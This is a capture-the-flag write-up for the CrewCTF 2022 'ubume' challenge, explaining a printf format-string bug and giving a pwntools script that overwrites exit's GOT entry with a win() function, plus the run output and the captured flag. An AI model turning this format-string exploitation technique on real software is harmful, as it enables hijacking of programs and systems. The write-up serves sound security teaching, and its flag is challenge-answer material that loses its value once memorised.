## Question 

isakhiwo somtya silala
Author : st4rn#0086
nc ubume.crewctf-2022.crewc.tf 1337

[chall](chall)

## Solution

The binary takes user input and displays it without a format specifier. 

```
00400729  int32_t main(int32_t argc, char** argv, char** envp) __noreturn

00400729  {
0040073d      void* fsbase;
0040073d      int64_t var_10 = *(int64_t*)((char*)fsbase + 0x28);
00400748      ignore_me();
00400754      puts("Haven't we met before?");
0040076d      void var_228;
0040076d      read(0, &var_228, 0x200);
00400781      printf(&var_228);
0040078b      exit(0);
0040078b      /* no return */
0040078b  }
```

Exit() the only function called after the format string vulnerbaility. So we can just overwrite it with the address of the win() function. We'll use pwntools fmtstr_payload() to create the format write, that overwrites the got address of exit() with the address of win().

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('ubume.crewctf-2022.crewc.tf', 1337)
    else:
        return process(e.path)

p = start()

payload_writes = {
        e.got['exit']: e.sym['win']
}

payload = fmtstr_payload(6,payload_writes,write_size='short')
p.sendline(payload)
p.interactive()
```

Running it gives us the flag. 

```
{7:52}~/workspace/crew-ctf/ubume ➭ python3 pwn-ubume.py BIN=./chall REMOTE
[*] '/root/workspace/crew-ctf/ubume/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loading gadgets for '/root/workspace/crew-ctf/ubume/chall'
[+] Opening connection to ubume.crewctf-2022.crewc.tf on port 1337: Done
[*] Switching to interactive mode
Haven't we met before?

new it. We've met before.
$ cat flag
crew{format_string_aattack_f0r_0verr1ding_GOT_!!!}
```